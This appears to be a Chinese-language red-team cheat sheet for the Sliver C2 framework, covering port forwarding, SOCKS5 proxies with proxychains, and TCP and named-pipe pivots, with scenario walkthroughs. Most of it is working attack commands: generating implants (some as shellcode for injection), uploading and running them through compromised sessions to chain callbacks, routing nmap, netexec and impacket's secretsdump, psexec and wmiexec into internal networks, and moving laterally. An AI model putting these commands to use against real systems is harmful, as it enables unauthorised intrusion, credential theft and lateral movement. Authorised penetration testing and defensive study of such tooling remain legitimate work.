# 网络穿透与代理

## 端口转发

### 本地端口转发 (portfwd)

通过 implant 访问目标内网资源，流量路径: 攻击者本地端口 -> Sliver -> Implant -> 内网目标。

```bash
# 基础用法 (默认绑定 127.0.0.1:8080)
sliver (SESSION) > portfwd add --remote 10.10.10.10:3389

# 自定义本地绑定
sliver (SESSION) > portfwd add --bind 0.0.0.0:1234 --remote 10.10.10.10:22

# 列出端口转发
sliver (SESSION) > portfwd

# 删除端口转发
sliver (SESSION) > portfwd rm ID
```

### 反向端口转发 (rportfwd)

将目标机器的端口暴露到攻击者可达的地址。

```bash
# 目标监听 8080，转发到本地 80
sliver (SESSION) > rportfwd add --remote 0.0.0.0:8080 --local 127.0.0.1:80

# 列出反向端口转发
sliver (SESSION) > rportfwd

# 删除
sliver (SESSION) > rportfwd rm ID
```

### WireGuard 端口转发

需要 WireGuard C2，比普通端口转发更快更稳定。

```bash
# 添加 WireGuard 端口转发
sliver (SESSION) > wg-portfwd add --remote 10.10.10.10:3389

# 通过 implant 的 WireGuard IP 访问
# 例如: 100.64.0.17:1080 -> 10.10.10.10:3389
```

---

## SOCKS5 代理

### 启动代理

```bash
# 启动 SOCKS5 代理 (默认 127.0.0.1:1081)
sliver (SESSION) > socks5 start

# 自定义端口
sliver (SESSION) > socks5 start --port 1080

# WireGuard SOCKS (更稳定)
sliver (SESSION) > wg-socks start

# 停止代理
sliver (SESSION) > socks5 stop
```

### proxychains4 配置

编辑 `/etc/proxychains4.conf`:

```ini
# /etc/proxychains4.conf

# 使用 strict_chain (严格模式，代理失败则停止)
strict_chain

# 或使用 dynamic_chain (动态模式，跳过失败的代理)
# dynamic_chain

# 禁用 DNS 泄露
proxy_dns

# 超时设置 (毫秒)
tcp_read_time_out 15000
tcp_connect_time_out 8000

# 代理列表 (文件末尾)
[ProxyList]
# Sliver SOCKS5 代理
socks5 127.0.0.1 1080
```

快速配置:

```bash
sudo sed -i 's/^socks4.*/socks5 127.0.0.1 1080/' /etc/proxychains4.conf
```

### 工具链路由

```bash
# nmap (仅支持 -sT TCP Connect 扫描)
proxychains4 -q nmap -sT -Pn -p 22,80,443,445,3389 10.10.10.0/24

# netexec
proxychains4 -q netexec smb 10.10.10.0/24

# impacket 工具
proxychains4 -q secretsdump.py domain/user:pass@10.10.10.10
proxychains4 -q psexec.py domain/user:pass@10.10.10.10
proxychains4 -q wmiexec.py domain/user:pass@10.10.10.10

# smbclient
proxychains4 -q smbclient.py domain/user:pass@10.10.10.10
```

### 注意事项

- SOCKS 代理监听在 **Sliver 服务端**，不是本地机器
- 如果通过 SSH 连接 Sliver 服务端，需要做 SSH 端口转发或在服务端执行命令
- 使用 `-q` 参数避免 proxychains4 输出干扰命令结果
- nmap 通过代理只能使用 `-sT` (TCP Connect) 扫描，不支持 SYN 扫描

---

## TCP Pivot

用于将 C2 流量通过一个 implant 转发到另一个 implant，适合无法直接出网的内网目标。

### 基础用法

```bash
# 1. 在已有会话上启动 TCP pivot 监听器
sliver (EGRESS_SESSION) > pivots tcp --bind 0.0.0.0:9898

# 2. 查看 pivot
sliver (EGRESS_SESSION) > pivots
# ID   Protocol   Bind Address   Number Of Pivots
# ==== ========== ============== ==================
#   1   TCP        :9898                         0

# 3. 生成连接到 pivot 的 implant
sliver > generate --tcp-pivot 192.168.1.100:9898 --save /tmp

# 4. 在目标上执行 pivot implant，新会话将通过 EGRESS_SESSION 回连
```

### 链式拓扑 (多层穿透)

```
[Attacker] <--mTLS--> [Session1/DMZ] <--TCP Pivot--> [Session2/内网]
```

```bash
# 1. 在 DMZ 机器 (Session1) 启动 pivot
sliver (SESSION1) > pivots tcp --bind 0.0.0.0:9898

# 2. 生成连接到 pivot 的内网 implant
sliver > generate --tcp-pivot 10.10.10.5:9898 --save /tmp

# 3. 通过 Session1 上传并执行
sliver (SESSION1) > upload /tmp/INTERNAL_IMPLANT /tmp/
sliver (SESSION1) > execute /tmp/INTERNAL_IMPLANT

# 4. 内网会话建立
# [*] Session xxx - 10.10.10.5:9898->SESSION1->
```

三层穿透:

```
[Attacker] <--mTLS--> [A/边界] <--TCP Pivot--> [B/二层] <--Named Pipe--> [C/三层]
```

```bash
# 在 A 上启动 TCP pivot
sliver (IMPLANT_A) > pivots tcp --bind 0.0.0.0:9898

# 生成连接到 A 的 Implant B
sliver > generate --tcp-pivot 10.10.10.1:9898 --save /tmp

# 在 B 上启动 Named Pipe pivot
sliver (IMPLANT_B) > pivots named-pipe --bind chain

# 生成连接到 B 的 Implant C
sliver > generate --named-pipe 10.10.10.2/pipe/chain --save /tmp
```

---

## Named Pipe Pivot

仅 Windows 支持，使用 SMB 命名管道通信。适合同网段横向移动，流量不出网，在 Windows 域环境中更隐蔽。

### 基础用法

```bash
# 1. 启动命名管道监听器
sliver (SESSION) > pivots named-pipe --bind mypipe

# 允许所有用户连接 (默认仅当前用户)
sliver (SESSION) > pivots named-pipe --bind mypipe --allow-all

# 2. 生成 pivot implant
sliver > generate --named-pipe 192.168.1.100/pipe/mypipe --save /tmp
# 语法: <host>/pipe/<pipe_name>
# "." 等同于 127.0.0.1

# 3. 在目标上执行 pivot implant
```

---

## 场景演练

### 场景 1: RDP 访问内网主机

```bash
# 1. 建立端口转发
sliver (SESSION) > portfwd add --remote 10.10.10.10:3389

# 2. 通过本地端口连接 RDP
xfreerdp /v:127.0.0.1:8080 /u:admin /p:password
```

### 场景 2: 内网网络扫描

```bash
# 1. 启动 SOCKS 代理
sliver (SESSION) > socks5 start --port 1080

# 2. 配置 proxychains
sudo sed -i 's/^socks4.*/socks5 127.0.0.1 1080/' /etc/proxychains4.conf

# 3. 扫描内网
proxychains4 -q nmap -sT -Pn 10.10.10.0/24 -p 22,80,443,445
proxychains4 -q netexec smb 10.10.10.0/24
```

### 场景 3: 双层网络穿透

```
Internet --> DMZ (10.10.10.0/24) --> Internal (192.168.1.0/24)
```

```bash
# 1. 在 DMZ 机器上启动 pivot (已有 mTLS 会话)
sliver (DMZ_SESSION) > pivots tcp --bind 0.0.0.0:9898

# 2. 生成内网 implant
sliver > generate --tcp-pivot 10.10.10.5:9898 --save /tmp

# 3. 通过 DMZ 会话上传并执行
sliver (DMZ_SESSION) > upload /tmp/INTERNAL_IMPLANT /tmp/
sliver (DMZ_SESSION) > execute /tmp/INTERNAL_IMPLANT

# 4. 在内网会话上启动 SOCKS 代理
sliver (INTERNAL_SESSION) > socks5 start --port 1081

# 5. 扫描内部网络
proxychains4 -q nmap -sT -Pn 192.168.1.0/24 -p 445,389,88
```

### 场景 4: 横向移动 (Named Pipe)

```bash
# 1. 在已控机器上启动 Named Pipe pivot
sliver (CONTROLLED) > pivots named-pipe --bind lateral --allow-all

# 2. 生成 pivot implant (shellcode 格式便于注入)
sliver > generate --named-pipe ./pipe/lateral --format shellcode --save /tmp

# 3. 使用 psexec/wmi 等方式在目标执行
# 新会话将通过 CONTROLLED 机器回连
```

---

## Pivot 限制与注意事项

### 限制

- Pivot 仅支持 **Session 模式** (不支持 Beacon)
- Pivot implant 只能与 **同一服务器** 生成的 implant 通信
- Pivot 使用点对点加密密钥交换

### 性能排序

```
WireGuard 端口转发 > 普通端口转发 > TCP Pivot > Named Pipe Pivot
```

### 安全注意

- Named Pipe 默认只允许当前用户连接
- 使用 `--allow-all` 时需评估风险
- 多层 Pivot 会增加延迟
- Pivot 流量经过端到端加密
